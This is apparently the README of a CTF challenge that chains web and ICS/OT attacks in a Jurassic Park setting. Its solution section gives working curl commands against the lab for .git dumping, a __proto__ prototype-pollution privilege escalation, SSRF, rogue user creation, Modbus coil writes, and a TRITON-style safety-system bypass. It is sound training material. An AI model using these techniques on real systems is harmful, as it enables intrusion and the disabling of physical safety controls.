# ICSPark — CTF Web + OT (Jurassic Park)

Challenge de dificultad alta que mezcla **pentesting web** y **tecnologías OT/ICS**.
El jugador entra como auditor externo y debe encadenar 5 primitivas hasta enviar
el comando Modbus que **abre la puerta del paddock del T-Rex**. La flag aparece en
el visualizador (`:8082`) junto con la animación al abrirse esa puerta.

Ver [PLAN.md](PLAN.md) para el diseño completo.

## Arquitectura (3 contenedores)

| Contenedor | Tecnología | Redes | Rol |
|-----------|-----------|-------|-----|
| `web` | Node 20 + Express + React (Vite) | red-dmz, red-ot | 4 puertos (8081–8084) |
| `scada` | Python 3.12 + Flask + Swagger + pymodbus | red-ot, red-plc | HMI / API OT (BPCS) |
| `plc` | Python 3.12 + pymodbus (Modbus TCP) | red-plc | PLC de proceso (puertas) |
| `safety` | Python 3.12 + pymodbus (Modbus TCP) | red-plc | SIS-09 · logic solver de seguridad |

`red-ot` y `red-plc` son redes `internal` (sin salida a Internet). Solo `web`
publica puertos; `scada`, `plc` y `safety` nunca son alcanzables directamente.

El **SIS-09** es un controlador de seguridad **independiente del BPCS** (modelo
IEC 61511). Implementa la **SIF-09**: mantiene la puerta del recinto del T-Rex
(coil 9) en estado seguro (CERRADA) mientras la función esté armada — si el PLC
de proceso la abre, el SIS la vuelve a cerrar (*trip*). Solo deja de actuar con
un **bypass de mantenimiento** válido (el keyswitch del SIS quedó en PROGRAM).

### Puertos publicados por `web`
- **8081** Portal de auditores (React) — Swagger en `/api/docs`, `.git` expuesto.
- **8082** Visualizador de puertas del paddock (animación + flag).
- **8083** Consola de administración (requiere rol `administrator`; contiene el SSRF).
- **8084** Consola de ingeniería (arranca deshabilitada → 503; se activa por SSRF).

## Levantar

```bash
cp .env.example .env      # edita FINAL_FLAG y credenciales si quieres
docker compose up --build -d
```

Portal: http://localhost:8081  (usuario/clave por defecto: `auditor` / `inGen2025`)

### Reset (idempotente)
```bash
docker compose restart
```
Reinicia el estado en memoria (puertas cerradas, ingeniería deshabilitada,
usuarios de servicio y contaminación de prototipo eliminados).

## Uso de recursos
< 500 MB RAM y < 1 vCPU en total (límites definidos en `docker-compose.yml`).
Imágenes Alpine, build multi-stage de React, PLC con `pymodbus` (ligero).

---

## Solución oficial (spoilers)

1. **Recon + fuga de .git** (`:8081`)
   ```bash
   git-dumper http://localhost:8081/.git/ ./src
   ```
   El código revela el merge recursivo vulnerable (`server/lib/deepMerge.js`) y
   que el control de admin lee `acl.role` (`server/lib/auth.js`).

2. **Login como auditor** y **prototype pollution** en la generación de informes:
   ```bash
   curl -c jar http://localhost:8081/api/login -H 'content-type: application/json' \
     -d '{"username":"auditor","password":"inGen2025"}'
   curl -b jar http://localhost:8081/api/reports/download -H 'content-type: application/json' \
     -d '{"template":"audit-summary","options":{"__proto__":{"role":"administrator"}}}'
   ```
   Ahora todo objeto vacío hereda `role="administrator"` en el proceso.

3. **Acceso al panel admin** (`:8083`, misma cookie) y **SSRF** para activar ingeniería:
   ```bash
   curl -b jar http://localhost:8083/admin/preview -H 'content-type: application/json' \
     -d '{"url":"http://127.0.0.1:8084/internal/engineering/enable"}'
   ```
   El endpoint `/internal/...` solo acepta conexiones loopback → obligatorio vía SSRF.

4. **Consola de ingeniería** (`:8084`, ya operativa) → puente al SCADA:
   ```bash
   curl http://localhost:8084/eng/api/v1/plc/map      # coil 9 = PADDOCK-09 (T-Rex)
   curl http://localhost:8084/eng/api/v1/doors
   ```

5. **Enumerar la API del SCADA** (OpenAPI interno expuesto por el puente) y
   **crear usuario `engineering_manager`**:
   ```bash
   curl http://localhost:8084/eng/openapi              # revela /api/dev/users, /api/dev/plc/write
   curl -X POST http://localhost:8084/eng/api/dev/users -H 'content-type: application/json' \
     -d '{"username":"gerente_ingenieria","role":"engineering_manager"}'
   # -> devuelve un token svc-XXXXXX
   ```

6. **Intentar abrir la puerta del T-Rex** (coil 9) con el token del manager:
   ```bash
   curl -X POST http://localhost:8084/eng/api/dev/plc/write \
     -H 'content-type: application/json' -H 'X-Eng-Token: svc-XXXXXX' \
     -d '{"coil":9,"value":true}'
   ```
   La puerta **se vuelve a cerrar sola**: la SIF-09 del SIS-09 la lleva a estado
   seguro. Hay que neutralizar la capa de seguridad primero.

7. **Bypass del SIS** (estilo TRITON/TRISIS — el keyswitch está en PROGRAM):
   ```bash
   curl http://localhost:8084/eng/api/dev/safety/status  -H 'X-Eng-Token: svc-XXXXXX'
   # -> {"sif_armed":true,"maint_bypass":false,"keyswitch":"PROGRAM"}
   curl -X POST http://localhost:8084/eng/api/dev/safety/bypass \
     -H 'content-type: application/json' -H 'X-Eng-Token: svc-XXXXXX' \
     -d '{"enabled":true}'
   # -> "maint_bypass":true  (SIF neutralizada)
   ```

8. **Abrir la puerta** (ahora la SIF ya no la cierra):
   ```bash
   curl -X POST http://localhost:8084/eng/api/dev/plc/write \
     -H 'content-type: application/json' -H 'X-Eng-Token: svc-XXXXXX' \
     -d '{"coil":9,"value":true}'
   ```

9. Abre http://localhost:8082 → animación + **flag**.
